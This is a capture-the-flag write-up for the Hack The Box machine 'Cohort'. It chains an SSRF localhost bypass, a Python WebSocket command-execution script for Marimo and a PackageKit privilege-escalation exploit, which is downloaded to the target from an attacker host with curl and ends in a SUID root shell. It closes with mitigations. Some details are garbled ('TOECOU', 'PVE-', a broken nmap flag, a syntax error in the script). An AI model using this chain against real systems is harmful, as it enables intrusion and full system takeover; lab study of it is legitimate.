#! HTB Cohort (Season 11) – Full Write-up

***Machine***: Cohort  
***IP ***: [MACHINE_IP]  
***Attacker IP***: [ATTACKER_IP]  
***Difficulty***: Medium / Hard (Seasonal)  
***Techniques***: SSRF Bypass, Marimo WebSocket RCE (CVE-2026-39987), PackageKit TOECOU LPE (CVE-2026-41651)

---

## 1. Reconnaissance

### Nmap Scan
Initial scanning reveals standard web ports:

```bash
nmap -sC -sV -p [MACHINE_IP] -Pn
```

**Open ports**:  
- **80/tcp** -> HTTP (redirects to HTTPS)  
- **443/tcp** -> HTTPS (cohort.htb)

### DNS / Hosts
The SSL certificate or redirects point to `cohort.htb`. Add it to `/etc/hosts`:

```bash
echo "[MACHINE_IP] cohort.htb" >> /etc/hosts
```

---

## 2. Server-Side Request Forgery (SSRF)

### The Vulnerability
Navigating to `https://cohort.htb/portal.html`, we find a "Data Source Validation" feature. It sends a POST request to `/api/validate` with a `url` parameter.

### Bypassing Localhost Restrictions
Directly using `127.0.0.1` is blocked. However, we can bypass it using the shorthand notation:

```http
POST /api/validate HTTP/1.1
Host: cohort.htb
...

url=http://127.1
```

### Internal Enumeration
Using this SSRF, we scan internal ports. We discover two internal services:

- **Port 5000**: Internal Flask API  
- **Port 8888**: Marimo Notebook

### Discovering the Virtual Host
Querying `http://127.1/status` via SSRF on port 80 reveals an Nginx status page with upstream configuration:

```json
{
  "service": "cohort-edge",
  "upstreams": [
    {"name": "notebooks", "host": "nb-1be3782a8afd3ad5.cohort.htb", "target": "127.0.0.1:8888"}
  ]
}
```

We discover the internal vhost: `nb-1be3782a8afd3ad5.cohort.htb`.  
Direct IP access on port 8888 fails; we must use this specific `Host` control.

---

## 3. Foothold – Marimo RCE (CVE-2026-39987)

### Identification
Marimo version **0.20.4** is vulnerable to **CVE-2026-39987**: an unauthenticated WebSocket endpoint (`/terminal/ws`) allows arbitrary command execution.

### WebSocket Exploit
We connect to the WebSocket using a Python script. The target is `wss://[MACHINE_IP]/terminal/ws` with the appropriate `Host` header.

### Python Exploit Script (`shell.py`)

```python
import ssl
import threading
import websocket

host = "nb-1be3782a8afd3ad5.cohort.htb"
ws_url = "wss://[MACHINE_IP]/terminal/ws"

ws = None

def recv_loop():
    global ws
    while True:
        try:
            data = ws.recv()
            print(data, end="")
        except Exception:
            print("\n[!] Connection lost")
            break

def main():
    global ws
    ws = websocket.create_connection(
        ws_url,
        host=host,
        origin="https://" + host,
        sslopt={"cert_reqs": ssl.CERT_NONE},
        timeout=5,
    )
    print("[+] WebSocket connected. Type 'exit' to quit.")
    threading.Thread(target=recv_loop, daemon=True).start()
    while True:
        cmd = input("")
        if cmd.lower() == "exit":
            break
        ws.send(cmd + "\r")
    ws.close(*

if __name__ == "__main__":
    main()
```

### Getting the Shell
Running the script establishes a reverse-like interactive shell directly on the target. We land as user `marimo`. We can now read the **User Flag**:

```bash
cat /home/marimo/user.txt
```

---

## 4. Local Privilege Escalation – PackageKit (CVE-2026-41651)

### Enumeration
Checking the OS and installed packages:

```bash
cat /etc/os-release
# Ubuntu 24.04.4 LTS

pkcon --version
# 1.2.8
```

This version is vulnerable to **CVE-2026-41651**, a TOCTOU (Time-of-check to time-of-use) flaw in the D-Bus transaction logic, allowing a local user to install arbitrary packages as root.

### Compiling the Exploit

We need to compile the exploit on our attacker machine. The exploit is written in C and requires GLib/GIO libraries.

**1. Install dependencies on Attacker (Kali/Parrot):**

```bash
sudo apt update
sudo apt install -y libglib-2.0-dev libgio-2.0-dev pkg-config build-essential
```

**2. Save the exploit source code** (from [CVE-2026-41651](https://github.com/gbuyssens/CVE-2026-41651) or similar) to `exploit.c`.

**3. Compile:**

```bash
gcc -o exploit exploit.c `pkg-config --cflags --libs glib-2.0 gio-2.0` -Wall
```

### Transferring the Exploit

**1. Host the file on attacker machine:**

```bash
python3 -m http.server 8080 --bind [ATTACKER_IP]
```

**2. Download on target (via the WebSocket shell):**

```bash
curl -o /tmp/exploit http://[ATTACKER_IP]:8080/exploit
chmod +x /tmp/exploit
```

### Execution

**1. Run the exploit in the background:**

```bash
nohup /tmp/exploit > /tmp/pk.log 2>&1 &
```

**2. Monitor logs (optional):**

```bash
tail -f /tmp/pk.log
```

After approximately 30 seconds to 2 minutes, the exploit creates `/tmp/.suid_bash`.

**3. Verify SUID binary:**

```bash
ls -la /tmp/.suid_bash
# -rwsr-xrxr-1 root root ... /tmp/.suid_bash
```

---

## 5. Root Flag

Execute commands as root using the SUID binary with the `-p` flag:

```bash
/tmp/.suid_bash -p -c 'id'
  # uid=0(root) gid=1000(marimo) ... 

/tmp/.suid_bash -p -c 'cat /root/root.txt'
```

**Congratulations!** We have successfully compromised the machine.

---

## Attack Chain Summary

| Phase | Vulnerability / Technique | Outcome |
| :--- | :--- | :--- |
| **Recon** | Nmap, DNS enumeration | Identified `cohort.htb` |
| **SSRF** | Bypass `127.0.0.1` -> `127.1` | Discovered internal Marimo service and vhost |
| **RCE** | CVE-2026-39987 (Marimo WebSocket) | Shell as `marimo` |
| **LPE** | PVE-2026-41651 (PackageKit TOECOU) | Root privileges & `root.txt` |

## Mitigations

1.  **SSRF**: Implement strict allowlists for URL validation, avoid using raw user input for internal requests.
   
2.  **Marimo**: Update to version **>= 0.23.0**.
   
3.  **PackageKit**: Update to version **>= 1.3.5** (or apply the vendor security patch).
